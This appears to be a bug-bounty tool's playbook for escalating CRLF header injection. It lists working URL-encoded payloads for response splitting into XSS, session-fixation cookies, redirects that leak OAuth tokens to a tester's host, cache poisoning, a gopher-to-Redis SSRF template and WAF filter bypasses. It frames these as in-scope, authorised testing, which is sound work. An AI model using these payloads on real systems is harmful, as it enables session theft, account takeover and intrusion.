# Chaining CRLF to real impact

A raw CRLF primitive (a token echoed into a header) is usually **low** on its
own. Its value is as a stepping stone. For every double-confirmed finding,
`playbook.md` lists the realistic escalation paths with manual PoC templates.
Run these by hand, in scope only.

## 1. CRLF → HTTP response splitting → XSS
If the server emits a full second response, a script body executes in the
browser.
```
param=%0d%0aContent-Length:0%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:text/html%0d%0aContent-Length:39%0d%0a%0d%0a%3Cscript%3Ealert(document.domain)%3C/script%3E
```
Confirm: open in a browser, see the alert. Escalate: swap for `document.cookie`
or a `fetch()` to your host to show data theft.

## 2. CRLF → Set-Cookie → session fixation
Fix a known session/CSRF cookie in the victim's browser.
```
param=%0d%0aSet-Cookie:sessionid=ATTACKER_FIXED;Path=/
```
Confirm the cookie lands, then that it persists across an authenticated request.

## 3. CRLF → Location → open redirect → OAuth token theft / ATO
A forced redirect can leak OAuth codes/tokens if this sits in an auth flow.
```
param=%0d%0aLocation:https://YOUR-OOB-HOST/
```
Confirm the 30x goes to your host; in an OAuth/SSO flow, chase the leaked
`code`/token in the request to your host.

## 4. CRLF → response splitting → web cache poisoning (mass impact)
A cached split response is served to other users. **Only if the program allows
cache attacks.** Stop at a benign marker; never serve malicious content to real
users.
```
param=%0d%0aContent-Length:0%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:text/html%0d%0a%0d%0a%3Ch1%3Epoisoned%3C/h1%3E
```
Look for a cache first (`Age`, `X-Cache`, CDN headers); confirm the poisoned
response is served to a second, clean request.

## 5. CRLF → SSRF → RCE (protocol / queue injection)
Only when the sink **fetches the value server-side** (params like `url`,
`redirect`, `callback`, `webhook`, `proxy`, `image`, `git`). If CRLF can inject
into `gopher://`, `redis://`, `dict://` or SMTP, reaching an internal Redis or
job queue can reach RCE — the class of the GitLab `git://` → Redis report
(HackerOne #441090).

Process:
1. Prove outbound SSRF with `--oob-url` (your own listener) — do NOT skip this.
2. Enumerate internal services: `127.0.0.1:6379` (redis), `:11211` (memcached),
   `169.254.169.254` (cloud metadata).
3. Only against **in-scope** infra with **explicit permission**, craft the
   gopher/redis payload by hand.
4. Never fire at third-party or out-of-scope internal hosts.

Template (fill in manually):
```
param=gopher://127.0.0.1:6379/_<CRLF-separated Redis commands>
```

## Filter bypasses (when `%0d%0a` is blocked)
| Filter | Bypass |
|--------|--------|
| blacklist `%0d%0a` | double-encode `%250d%250a` |
| case filter | `%0D%0A` |
| partial | `%00%0d%0a`, `%20%0d%0a` |
| WAF | unicode `%u000d%u000a`; UTF-8 strip `%E5%98%8A%E5%98%8D` (嘊嘍) |

All of these are already in `crlf_payloads.txt`.

## Discipline
- The tool flags chains and hands you payloads; **it never fires them**.
- Confirm reachability (OOB) before SSRF work.
- Keep every test in scope; the RCE path especially can hit infra you must not
  touch.
